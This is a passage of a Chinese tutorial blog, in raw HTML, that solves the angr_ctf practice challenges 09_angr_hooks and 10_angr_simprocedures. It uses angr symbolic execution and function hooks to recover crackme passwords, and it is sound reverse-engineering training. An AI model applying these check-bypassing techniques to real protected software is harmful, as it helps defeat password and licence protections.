data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>该脚本使用 Angr 工具自动化解决二进制文件中的密码问题。它首先加载二进制文件，然后使用  <code>angr.Project()</code>  创建一个项目对象。接下来，它使用初始状态创建一个符号变量  <code>password</code> ，并将其存储在地址  <code>0x804a040</code>  中。然后，它使用  <code>project.factory.simgr()</code>  创建一个模拟器对象，该对象用于探索状态空间以找到目标状态。接着，它探索状态空间以找到特定地址  <code>0x8048683</code> ，该地址检查密码是否正确。<strong>如果找到目标状态，则添加约束条件，使  <code>constrained_parameter_bitvector</code>  等于预期值。最后，它使用  <code>solver.eval()</code>  求解约束条件</strong>，并打印出解决方案。如果找不到解决方案，则会引发异常。</p>\n<h3 id=\"09_angr_hooks\"><a class=\"markdownIt-Anchor\" href=\"#09_angr_hooks\">#</a> 09_angr_hooks</h3>\n<p><s>之前三面学过 inline hook 但还没咋应用过</s></p>\n<p>学习使用 angr 的 hook 技术解决路径爆炸问题，与刚刚利用的约束条件不同，hook 技术则更为强大！</p>\n<h4 id=\"hook\"><a class=\"markdownIt-Anchor\" href=\"#hook\">#</a> Hook</h4>\n<p>angr 提供了简便的 Hook 接口，能够用于 Hook 被 angr 模拟执行的程序，它通常有两种方式：</p>\n<ul>\n<li>\n<p>装饰器 @project.hook</p>\n</li>\n<li>\n<p>函数 project.hook_symbol</p>\n<p>装饰器:</p>\n</li>\n</ul>\n<pre><code>@project.hook(0x80486B3, length=5)\n</code></pre>\n<p>第一个参数即需要 Hook 的调用函数的地址，第二个参数 length 即指定执行引擎在完成挂钩后应跳过多少字节。具体多少字节由 Hook 处地址的指令长度确定</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804A054</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            user_input_buffer_length</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'XKSPZSJKJYQCQXZV'</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        register_size_bit <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">)</span><span class=\"token comment\">#不再循环了</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><strong>脚本</strong></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./09_angr_hooks\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\"># Since Angr can handle the initial call to scanf, we can start from the</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token comment\"># beginning.</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    add_options <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span> angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_MEMORY<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                    angr<span class=\"token punctuation\">.</span>options<span class=\"token punctuation\">.</span>SYMBOL_FILL_UNCONSTRAINED_REGISTERS<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token comment\"># Hook the address of where check_equals_ is called.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  check_equals_called_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486ca</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token comment\"># The length parameter in angr.Hook specifies how many bytes the execution</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token comment\"># engine should skip after completing the hook. This will allow hooks to</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token comment\"># replace certain instructions (or groups of instructions). Determine the</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  <span class=\"token comment\"># instructions involved in calling check_equals_, and then determine how many</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>  <span class=\"token comment\"># bytes are used to represent them in memory. This will be the skip length.</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>  <span class=\"token comment\"># (!)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>  instruction_to_skip_length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>  <span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804a044</span> </pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>      user_input_buffer_length</pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># :string</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"43\"></td><td><pre>      claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Good Job.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>  <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token string\">'Try again.'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">in</span> stdout_output</pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>  simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>  <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token comment\"># Since we are allowing Angr to handle the input, retrieve it by printing</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token comment\"># the contents of stdin. Use one of the early levels as a reference.</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>    solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>  <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre></pre></td></tr><tr><td data-num=\"69\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>  main<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这段代码使用了 angr 工具包来通过符号执行解决程序的逆向分析问题。首先定义了程序路径 path_to_binary，然后使用 angr.Project 函数将其载入到 angr 中。接着使用 project.factory.entry_state 创建了一个初始状态 initial_state，该状态包含了程序的起始信息。然后，使用 project.hook 函数来注册了一个钩子函数，该钩子函数用于拦截到函数 check_equals_的调用，并修改其返回值。在钩子函数中，首先确定了用户输入的地址和长度，并使用 state.memory.load 方法从用户输入的地址中读取出用户输入的字符串。接着确定了需要与用户输入的字符串进行比较的字符串，并使用 claripy 库中的 If 方法来判断两者是否相等，从而修改 eax 寄存器中的值。最后，使用 project.factory.simgr 函数来创建了一个符号执行器 simulation，并使用其 explore 方法来探索符号执行的状态空间，直到找到满足 is_successful 条件的状态或避免 should_abort 条件的状态。如果找到了满足条件的状态，则从该状态中获取解决方案，并打印输出。否则，抛出异常并提示无法找到解决方案。</p>\n<p><strong>另一个版本</strong> (其实差不多)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">Go</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">\"./09_angr_hooks\"</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    check_equals_called_address <span class=\"token operator\">=</span> <span class=\"token number\">0x80486CA</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    instruction_to_skip_length <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token decorator annotation punctuation\">@project<span class=\"token punctuation\">.</span>hook</span><span class=\"token punctuation\">(</span>check_equals_called_address<span class=\"token punctuation\">,</span> length<span class=\"token operator\">=</span>instruction_to_skip_length<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">skip_check_equals_</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        user_input_buffer_address <span class=\"token operator\">=</span> <span class=\"token number\">0x804A044</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        user_input_buffer_length <span class=\"token operator\">=</span> <span class=\"token number\">16</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        user_input_string <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            user_input_buffer_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            user_input_buffer_length</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        check_against_string <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        register_size_bit <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        state<span class=\"token punctuation\">.</span>regs<span class=\"token punctuation\">.</span>eax <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            user_input_string <span class=\"token operator\">==</span> check_against_string<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> register_size_bit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">is_successful</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">should_abort</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        stdout_output <span class=\"token operator\">=</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span>  stdout_output<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>is_successful<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>should_abort<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            solution_state <span class=\"token operator\">=</span> i</pre></td></tr><tr><td data-num=\"52\"></td><td><pre>            solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[+] Success! Solution is: &#123;0&#125;\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token comment\">#print(solution0)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    Go<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"10_angr_simprocedures\"><a class=\"markdownIt-Anchor\" href=\"#10_angr_simprocedures\">#</a> 10_angr_simprocedures</h3>\n<p>学习如何利用函数名进行 hook，而不是复杂的利用函数的调用地址</p>\n<p>第十题的路径爆炸仍然发生在 check_equals 函数当中，与上一题的区别在于，此时输入的字符串被保存在局部变量当中，我们无法提前得知它的地址，因此如果要 hook 掉 check 函数，则必须获取 check 函数的参数。</p>\n<p>同时，我们可以发现 check_equals 被调用了很多次，以致于无法通过地址 Hook 每个调用位置。 这时我们必须使用 SimProcedure 编写我们自己的 check_equals 实现，然后通过函数名 Hook 所有对 check_equals 的调用</p>\n<p>因此需要使用 hook_symbol 的方式来 hook 掉 check 函数</p>\n<h4 id=\"hooking-symbols\"><a class=\"markdownIt-Anchor\" href=\"#hooking-symbols\">#</a> Hooking Symbols</h4>\n<p>每一个程序都有一个符号表，angr 可以确保从每个导入符号都可以解析出地址，可以使用 angr 提供的 <code>Project.hook_symbol</code> API 来通过符号名来 Hook 函数所有的调用地址，这意味着可以用自己的代码替换函数</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>time_strat <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>perf_counter<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Good'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span 